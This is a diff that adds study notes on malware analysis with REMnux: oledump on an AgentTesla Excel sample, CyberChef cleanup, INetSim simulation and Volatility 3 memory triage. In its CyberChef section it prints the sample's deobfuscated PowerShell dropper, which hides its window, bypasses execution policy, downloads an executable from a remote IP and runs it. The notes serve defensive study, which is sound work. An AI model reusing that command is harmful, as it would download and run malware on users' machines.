@@ -431,3 +431,215 @@ In this room/guide, we covered how **capa** accelerates static analysis by detec
 - Use **Web Explorer** to understand **why** rules matched.
 
 Happy hunting. 🛡️
+
+# REMnux — Getting Started (formatted notes)
+**Source:** User notes from REMnux: Getting Started room  
+**Prepared for:** GitHub (Markdown `.md`)  
+**Date:** October 27, 2025
+
+---
+
+## Overview
+Analysing potentially malicious software can be daunting — especially during an active security incident. REMnux is a specialized Linux distribution preloaded with forensic and malware-analysis tools (e.g., Volatility, YARA, Wireshark, oledump, INetSim) to create a sandboxed analysis environment. This guide walks through a hands-on introduction using REMnux: static analysis with `oledump.py`, dynamic simulation with `INetSim`, memory preprocessing with Volatility 3, and the `strings` utility.
+
+---
+
+## Table of contents
+- [OLE / VBA static analysis with `oledump.py`](#ole--vba-static-analysis-with-oledumppy)
+- [Decompressing and cleaning embedded macros (CyberChef)](#decompressing-and-cleaning-embedded-macros-cyberchef)
+- [INetSim — simulating network services and downloads](#inetsim---simulating-network-services-and-downloads)
+- [Volatility 3 — memory preprocessing (Windows plugins)](#volatility-3---memory-preprocessing-windows-plugins)
+- [Batch preprocessing loop example](#batch-preprocessing-loop-example)
+- [Extracting strings (ASCII + Unicode)](#extracting-strings-ascii--unicode)
+- [Summary and notes](#summary-and-notes)
+
+---
+
+## OLE / VBA static analysis with `oledump.py`
+
+**Context:** We analyze `agenttesla.xlsm` located in `/home/ubuntu/Desktop/tasks/agenttesla/` on the REMnux VM.
+
+**Basic oledump usage**
+```bash
+# list OLE streams (run from the folder containing agenttesla.xlsm)
+oledump.py agenttesla.xlsm
+```
+
+**Sample output interpretation**
+```
+A: xl/vbaProject.bin
+ A1:       468 'PROJECT'
+ A2:        62 'PROJECTwm'
+ A3: m     169 'VBA/Sheet1'
+ A4: M     688 'VBA/ThisWorkbook'
+ A5:         7 'VBA/_VBA_PROJECT'
+ A6:       209 'VBA/dir'
+```
+- The capital `M` before an item indicates a macro stream — check these first.
+- The `A` index is the OLE container; the numeric index indicates the stream.
+
+**View a specific stream (example: stream 4)**
+```bash
+oledump.py agenttesla.xlsm -s 4
+# Output will show the raw (often compressed) VBA data
+```
+
+**Decompress VBA macros for readability**
+```bash
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+```
+
+---
+
+## Decompressing and cleaning embedded macros (CyberChef)
+
+**Observed obfuscated VBA snippet (example)**
+```
+Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
+Sqtnew = Replace(Sqtnew, "*", "")
+Sqtnew = Replace(Sqtnew, "^", "")
+```
+
+**Technique to clean the string (CyberChef approach)**
+1. Paste the raw Sqtnew value into CyberChef input.
+2. Use _Find / Replace_ operation twice:
+   - Replace `*` with an empty string.
+   - Replace `^` with an empty string.
+3. Result (readable PowerShell command):
+```powershell
+"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
+```
+
+**Notes about the recovered command**
+- `-WindowStyle hidden` hides the PowerShell window from the user.
+- `-executionpolicy bypass` ignores local script execution restrictions.
+- `Invoke-WebRequest -Uri ... -OutFile $TempFile` downloads a remote executable.
+- `Start-Process $TempFile` executes the downloaded file.
+- This demonstrates a common pattern: macro → PowerShell → remote executable download → execution.
+
+---
+
+## INetSim — simulating network services and downloads
+
+**Purpose:** Emulate network services locally so malware can be observed interacting with servers without touching the internet.
+
+**1. Configure REMnux IP and INetSim**
+- Determine machine IP:
+```bash
+ifconfig
+# or check the `ubuntu@MACHINE_IP` prompt
+```
+
+- Edit INetSim config and set DNS default IP:
+```bash
+sudo nano /etc/inetsim/inetsim.conf
+# find: #dns_default_ip 0.0.0.0
+# change to: dns_default_ip MACHINE_IP   (remove the leading #)
+# save (Ctrl+O), exit (Ctrl+X)
+```
+
+- Verify:
+```bash
+cat /etc/inetsim/inetsim.conf | grep dns_default_ip
+# Expected output: dns_default_ip MACHINE_IP
+```
+
+- Start INetSim:
+```bash
+sudo inetsim
+# Look for: "Simulation running" in the output
+```
+
+**2. From AttackBox (or another VM), access REMnux INetSim web UI**
+- Open browser on AttackBox and visit:
+```
+https://MACHINE_IP
+# Click through certificate warnings (self-signed) --> Accept the risk
+```
+
+**3. Download a payload from INetSim (simulated)**
+```bash
+sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
+sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
+```
+- Files downloaded are fake/sample files served by INetSim.
+
+**4. INetSim report**
+- Stop INetSim (Ctrl+C in the terminal running it) and check report directory:
+```bash
+# Reports saved to: /var/log/inetsim/report/
+sudo cat /var/log/inetsim/report/report.<session_id>.txt
+```
+
+**Sample report lines**
+```
+HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
+HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
+```
+
+---
+
+## Volatility 3 — memory preprocessing (Windows plugins)
+
+**Context:** Use Volatility 3 to extract artifact listings from a Windows memory capture `wcry.mem` in `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`.
+
+**Commonly used plugins (examples in the room)**
+- `windows.pstree.PsTree` — process tree (parent → child)
+- `windows.pslist.PsList` — list active processes
+- `windows.cmdline.CmdLine` — process command-line arguments
+- `windows.filescan.FileScan` — scan for file objects
+- `windows.dlllist.DllList` — modules loaded by processes
+- `windows.malfind.Malfind` — potential injected code regions
+- `windows.psscan.PsScan` — scan for process objects
+
+**Run each plugin (example)**
+```bash
+# become root
+sudo su
+cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/
+# run plugin example
+vol3 -f wcry.mem windows.pstree.PsTree
+vol3 -f wcry.mem windows.pslist.PsList
+vol3 -f wcry.mem windows.cmdline.CmdLine
+# ...and so on for other plugins
+```
+
+---
+
+## Batch preprocessing loop example
+
+Save the output of several Volatility plugins to separate text files (useful for triage / indexing):
+```bash
+for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
+  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
+done
+```
+- `-q` quiets progress output.
+- Each plugin's output is redirected to `wcry.<plugin>.txt` for later review.
+
+---
+
+## Extracting strings (ASCII + Unicode)
+
+Use `strings` to extract readable text from memory images in different encodings:
+
+```bash
+strings wcry.mem > wcry.strings.ascii.txt
+strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
+strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
+```
+
+- ASCII and Unicode string dumps help in quick triage and keyword searching.
+
+---
+
+## Summary and notes
+- REMnux is a preconfigured distro that accelerates malware and forensic analysis by bundling many common tools.
+- `oledump.py` helps identify and extract VBA macro streams from Office documents; `--vbadecompress` aids readability.
+- Small obfuscation tricks (character insertion/replacement) are often used to hide PowerShell payloads; CyberChef or simple find/replace can recover readable commands.
+- INetSim provides a controlled environment for observing network behavior (downloads, requests) without touching the internet.
+- Volatility 3 + `strings` are useful for preprocessing memory captures; automate plugin runs to save time during triage.
+- Always work inside isolated VMs and sandboxed networks when handling suspected malicious files.
+
+---
+
